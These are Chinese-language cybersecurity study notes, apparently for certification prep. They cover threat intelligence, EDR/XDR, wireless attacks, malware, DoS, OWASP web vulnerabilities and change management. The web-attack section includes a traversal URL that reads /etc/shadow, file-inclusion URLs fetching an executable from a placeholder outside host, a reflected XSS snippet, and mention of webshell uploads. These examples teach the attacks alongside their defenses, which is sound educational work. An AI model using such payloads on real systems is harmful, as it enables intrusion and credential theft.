一、網路安全控制措施

帳戶管理  僅保留被授予權限且未發生未授權修改的特權帳號
-日誌系統應利用NTP確保SIEM發送的日誌紀錄是否時間同步一致時間軸

-威脅情報  收集潛在威脅、利用各種來源獲得威脅
殺傷鏈
>偵查尋找或識別目標、確認位置、跟蹤定動、挑選打擊的武器、選定武器打擊、評估攻擊效果
>偵查(收集)、武器化(識別漏洞)、交付(漏洞途徑)、利用(利用漏洞)、安裝(安裝惡意代碼)、指揮控制(維護控制被操縱目標)、目標行動(達成目標)

MITRE ATT&CK  MITRE已識別戰術、技術和規程TTP的知識庫、網路殺傷鏈模型補充、TTP列矩陣一年只少更新兩次攻擊方法
>偵查>資源訪問>初始訪問>執行>持續存在>特權提升>防禦規避
>>憑證訪問>發現>橫向移動>收集>指揮控制>外洩>影響

威脅饋送feed, RSS(really simple syndication) 當前潛在威脅一種穩定原始數據流、但難提取有意義的數據或可執行情報、情報出售給客戶
>可疑域、已知惡意軟件的哈希值、網站共享代碼、關聯IP：：通過日誌跟蹤和手動交叉檢查威脅饋送、也可使用工具自動化
威脅搜尋hunting  主動查找威脅過程、就算沒有發告警也積極尋找跡象、避免惡意攻擊長期停留不被發現

SOAR,ML,AI,feed
-SOAR  要有劇本或指南來執行腳本、執行重覆步驟消除人為錯誤
-IDPS  經查誤判報告、但採用SOAR技術可自動處理誤判率、IDPS需實時更新威脅信息
-威脅饋送  如果SOAR技術能接受處理威脅饋送、能確保系統都知曉新威脅並自動響應(立即攔截、惡意軟件哈希)

端點安全
>確保對分布式體系結構想關需求和風險進行評估(桌面有敏感信息)、個人安全意識
>電子郵件篩選不會成為惡意軟體的媒介，篩選傳入出的數據並阻止可疑材料，多因認證對最終用戶設備訪問限制。
>根據需求使用機制和限制能訪問的關件信息，在儲存到客戶機文件數據加密，螢幕保護程式需再次登入、防止高權限進程或授權、不必要的訪問
>網域切分段、應安全備份儲存識別和補或文件、安全意識培訓、儲存介質防止被環境危害、PC納入DR或BCP
>使用正確配置的主設備系統映像將確保端點設備具有一致的基線

端點檢測和響應EDR 檢測、紀錄、評估、響應可疑活動和事件、連續監控本身及到達本地接口的網路通信，高級威脅攔截抵禦多個威脅
EPP 重點在 預測、預防、檢測、響應，"主動"進行預防、預測
XDR 包括EDR、MDR、EPP元素也包含 NTA、NIDS、NIPS
MSSP 託管安全服務供應商 集中控管XDR方案，可本地部屬或雲 ，可透過SOC進行監督  有提供EDR、MDR、EPP、XDR服務專業響應人員經驗跟知識


二、偵測到 IPS/IDS


三、PAN儲存


四、支付頁面的異常竄改
安全編碼實踐
-->源代碼註釋  解釋工作流程或給其他人提供重要細節，註釋被正確使用
--->>可能包含保密關鍵安全細節、確保注視版本保持機密性、編譯器會自動從可執行文件刪除註釋
--->>開發人員應在部署到正式區刪除註釋、保留已存檔代碼的註釋供未來開發人員參考不能讓未知用戶訪問

->>錯誤處理  測試代碼邊界而創造意外情況、防止惡意輸入觸發危險的錯誤條件
--->>必須預測可能發生意外狀況並編寫顯式指定錯誤處理代碼用安全方式介入處理、當作輔助控制措施
--->>過多詳細錯誤處理歷程則會讓攻擊找出利用代碼方法、僅向用戶顯示理解問題性質所需最少信息、
--->>應用程序在日誌盡可能詳細的信息以便開發人員糾正問題

->>硬編碼憑證 創建硬編碼hard-coding的維護帳戶、當身份認證系統失效時重新獲得訪問權又稱為後門漏洞
--->>後門漏洞：允許任何知道後門密碼繞過認證訪問系統造成所有代碼洩漏
--->>源代碼包含訪問憑證(API key或其他硬編碼憑證)發布到公共代碼倉庫


五、重要檔案異動


六、未授權的無線 AP

無線攻擊
-WIFI掃描機器 戰爭駕駛 通過撥打前睡或區號所有數字，可檢測到無封裝在法拉第龍的無線網路
-wep wpa wpa2都易受重裝攻擊

惡意接入點 流氓WAP  未做安全配置 
-有效複製WAP的SSID、MAC和無線信到以更高功率運行讓用戶不連接原始WAP
-SSID設置看起來與原始SSID一樣合法備用名稱
-連接無線鏈路時設置後使用VPN

evil twin  重新連線請求包括原始稽台MAC和網路SSID，evil twin是看到重新連接請求就用這些參數偽造身分 
-黑客可通過路徑攻擊竊聽導致會話劫持、數據操作憑證被盜和身分盜用
-因為身分認證和加密都是基站管理，客戶端也將收受基台提供的任何類型和存文本
-連接到錯誤AP以為自己連到有效基台，防範 歷史紀錄列表刪除不必要舊無線配置文件

解除關聯 ESSID蓋過WAP，讓客戶端失去無線連接能力，無法提供正確憑證，這些管理幀可用於多種攻擊
-對具隱藏SSID網路，將MAC地址偽造為WAP地址解除關聯數據並將發送連接的客戶端導致失去連線．然後重新發送請求包建立連結．
-對客戶端發送重覆的解除關聯幀防止重新關聯導致拒絕服務
-會話劫持通過解除關聯幀啟動，讓客戶保持斷開連接，同時模擬客戶端通過WAP接管無線會話
-使用相同的MAC,原始WAP,SSID，假WAP提供更強的信號導致客戶連接錯誤，攻擊者連到有效WAP



網路安全控制措施
```

持續鑑測關鍵績效和風險指標、定期查看
-遺留漏洞數量、修復漏洞耗時、漏洞缺陷重線、被盜用帳戶數量、部署前掃瞄檢測軟件缺陷數量、重覆審計結果、嘗試訪問已知惡意站點用戶
邏輯炸彈  感染系統並滿足一個或多個條件、現保持休眠的惡意代碼、由開發人員植入用戶制定應用程序的邏輯炸彈會週期性破壞軟件導致中斷或數據丟失
->特洛伊木馬  禁用未經許可軟件降低被木馬破壞風險、是個軟件程序儲存在系統包含惡意有效載荷、系統或網路的破壞
-->>遠程訪問木馬RAT  打開後門控制被感染的系統、主要竊取受感染'系統計算能力'進行挖礦、也稱為加密惡意軟件
-->>殭屍網路  未安裝防毒被木馬感染的系統成為殭屍網路的成員、殭屍牧人控制眾多計算器組成、反覆檢索同網站導致負荷過高出現故障

-拒絕服務攻擊DoS阻止合法訪問或請求、向服務器丟大量的數據包或已知漏洞讓系統無法癱瘓或崩潰、讓系統運行變慢、數據損毀、服務被攔截
>DoS來自單個系統或單系統為目標、利用假造源地址保持匿名很少是真實IP、DDoS多個系統協同攻擊一個、通常利用殭屍網發動DDoS、不會單獨存在
>分布式反射型拒絕服務DRDoS 不直接攻擊受害而是操縱通信流或網路服務、從其他來源反射回受害者 DNS中毒,smurf,fraggle
-零日利用  未知漏洞攻擊、不需要服務或協議就移除停用、啟用基於網路和主機的防火牆限制潛在惡意流量跟檢測攔截攻擊、或用蜜罐觀察攻擊情況
>攻擊扯最先發現漏洞輕易利用供應商未察覺這個漏洞、因而開發或發布補丁
>供應商獲悉漏洞但未發布補丁  利用發布前的空擋攻擊因為公眾不知道這個漏洞
>供應商發布補丁系統24小時內被攻擊  利用時間差攻擊
```

IPS/IDS
```

-殭屍網  按照一台指令多台命令和控制C&C,C2、保持休眠到具體日期時間對某件事作出響應發起大範萬的DDoS發送垃圾釣魚走件
>防止系統拉近殭屍網最好採用深度防禦戰略多層次安全保護避免感染、確保是最新的反惡意軟體程序保護
>教育訓練防止釣魚信點擊連結或下載惡意軟件或騙取用戶口令、內建的沙箱隔離web應用程序
>製造商在設計或建構這些系統應充分考慮安全因素給IoT設備易於更新
```
PAN儲存回應
/SIEM/DLP
```
應用程序攻擊
1緩衝區溢出
-->>沒正確驗證用戶輸入適當大小內容、覆蓋內存相鄰的其他數據造成執行其他目標指令。
-->>開發人員注意允許輸入變量長度限制條件滿足、邊界檢查防止超出範圍、用戶不能輸入無效值
3檢查chk時間到使用use時間 TOC/TOU
->>根據任務執行可能發起攻擊:檢查資源可用、訪問他、TOC/TOU之間差異足以驗證身分後替換數據文件。
-->>每當對資料檢查會有空檔替換、竟態條件攻擊和通信中斷稱為狀態攻擊:特定時間、數據留控制及系統狀態留轉換

3後門 繞過正常訪問限制、在開發和調試過程後們常用加快工作流程
-->>後門不備紀錄文檔的性質成為系統安全嚴重威脅，檢索機密訊息、監控用戶活動或進行破壞

特權提升
4->>rootkit利用已知漏洞，通過密碼攻擊或社交工程獲得普通用戶帳戶訪問權限，利用rootkit提權
-->>也可以使用無文件惡意軟件、腳本或攻擊向量、最新補丁跟持續應用補救措施。

SIEM:監測多個系統、SOAR：常見攻擊自動做響應

安全編排自動事件響應SOAR 組織自動響應某些事件的技術、安管人員靠手動操作並核實每個告警再作出響應
>根據事件不同發數告警並採取其他行動、安管人員可以使用腳本自動化定義及對事件響應或手動執行

-機器學習和AI工具
>機器學習事AI的一部分、通過經驗自動改進賦予學習能力、基線起點歸納規則才能有勝算
>AI包含機器學習還具備不需要人工干預狀況完成任務、從無到有反覆與自己練增加經驗哪些是有效跟無效策略的回饋自己獨立算法
-->AI包括深度學習、ML、專家(知識庫+推理系統)、自然語言



```
支付頁異常竄改
```


利用授權漏洞
-->>OWASP 提高在現或基線的 WEB應用程序安全性、前十大風險榜單做安全評估和滲透的合理起點
不安全的直接對象引用  查詢或請求參數值截從數據庫檢索信息、進行修改
->>應用程式仍負責確保用戶經過適當身分驗證，並備受權請求的文檔

目錄遍歷  安全配置錯誤而允許用戶瀏覽目錄結構並可訪問應保密文件或未正確限制對儲存在服務器其他位子
www.abc.com/rty.php -> /var/www/html/rty.php
->>若要尋找shadow文件只要輸入  www.abc.com/../../../etc/shadow  #回上三層再cd /etc/shadow

文件包含  實際執行文件包含代碼 在c:\www\upload\atck.exe  --> http://www.abc.com/app.php?include=c:\\www\upload\\atck.exe
->>持行遠程服務器代碼不必儲存在服務器上  --> http://www.abc.com/app.php?include=http://www.qwe.com/atck.exe
-->>上傳webshell到服務器並執行命令在瀏覽器查看結果、通常透過80,443訪問服務器所以不易被檢測到、
-->>可能會修復用過取得權限漏洞防止其他攻擊者發現利用、或得到攻擊成功消息的安全團隊發現該漏洞


防禦：輸入驗證、轉譯元字符、防禦性編碼
跨站腳本  web應用程式允許執行HTML注入網頁插入自己代碼就會發生XSS、
->>反射XSS  允許反射輸入、使用luke<script>alert('ballo')</script> 就會顯示文字ballo並執行腳本部分
-->>看似'可信'網站隨後會執行表單輸入框輸入嵌入腳本、應確定允許輸入類型並驗證實際輸入匹配、
-->>輸出編碼將潛在危險內容轉換安全形式  '  --> &#x27

->>儲存持續XSS   遠程服務器儲存跨站腳本代碼、沒有主動發起攻擊也會保留在服務器上(留言板)
-->>當用戶加載就會彈出插入的腳本定向到釣魚網站

請求偽造 
->>跨站請求偽造XSRF,CSRF(誘騙用戶)  利用遠程站點對用戶系統信任嵌入代碼並不知覺代表用戶向第二站點執行命令、
-->>連結中嵌入安全令牌、或讓網站檢查最終用戶接收到的請求引用URL並接受源於他們自己的站點請求

->>服務器端請求偽造SSRF(誘騙服務器) 根據用戶輸入訪問URL作為輸入、從該URL檢索就會發生SSRF去訪問未公開私人URL

會話劫持  攔截授權用戶和資源部分通信兵接管會話和假冒授權用戶的身份
->>捕獲用戶和服務器間身份認證詳細信息去假冒身份、誘騙客戶攻擊者系統就是服務、建立合法連接充當中介然後斷開客戶端的連接
->>使用未正確關閉連接用戶cookie數據訪問web應用程序、設計未正確管理身份認證cookie的應用程序訪問
->>管理控制：反重放身份認證技術、應用程序控制：合理時間使cookie過期




間諜軟件與廣告軟件  監控你的行為活動的遠程系統傳送重要細節(PAN卡號)、監控購物行為並重定向到競爭者網站
->潛在有害程序PUP  用戶可能同意安裝在系統上然後軟件背地執行未授權功能、在原始插件代碼添加惡意代碼散播竊取或進行有害活動
```

```

管理變更(補丁、變更、配置)

-變更管理流程確保對應人員在變更前進行審核和批准、確保對變更進行測試和紀錄
-變更引發造成中斷意外、安全性和可用性最佳平衡、採用有效訪問控制模型限制用戶訪問權限

變更管理    執行安全影響分析、控制、紀錄、跟蹤、審計所有系統的生命週期中的變更
-請求：識別所需變更提出請求並記錄、審核：內部專家不同領域大量測試經過正式批審、批准拒絕：依據審核結果，需創建回滾或退出計畫當故障發生回復到原始狀態
-變更測試：驗證變更是否造成意外的問題、安排實施：造成影響最小安排休班或非高峰時段、紀錄變更：所有相關方知悉變更，變更文檔有助恢復變更前狀態
-ISO 安全保障要求SAR    防止引發意外損失的未授權變更提高組織環境的安全性

版本控制    標籤或歷史歷程版號、助於追蹤部署軟件隨時間的變更、否則可能會被極大破壞網站
配置文檔    明確系統當前配置、系統負責人、系統目的、應用基線的所有變更、儲存紙本或數據庫文件
系統管理    應安裝補丁以防類似攻擊再出現、使用移動設備應納入管理



漏洞管理    定期識別漏洞、評估、採取措施減輕漏洞相關風險、日常漏洞掃描、定期漏洞評估

漏洞掃描    是否存在已知安全問題、列舉系統中所有的漏洞、儘早進行修補
-但發生不可行狀況會破壞系統應用程序、管理層可能決定開發人員提出變通方法前不安裝補丁
-管理層決定接受風險、而是實施控制措施後仍然存在的風險、產生任何損失都是管理層責任

常見漏洞和披露CVE  由MITRE維護、易於創建補丁管理和漏洞管理工具、專注檢查漏洞系統方法
```

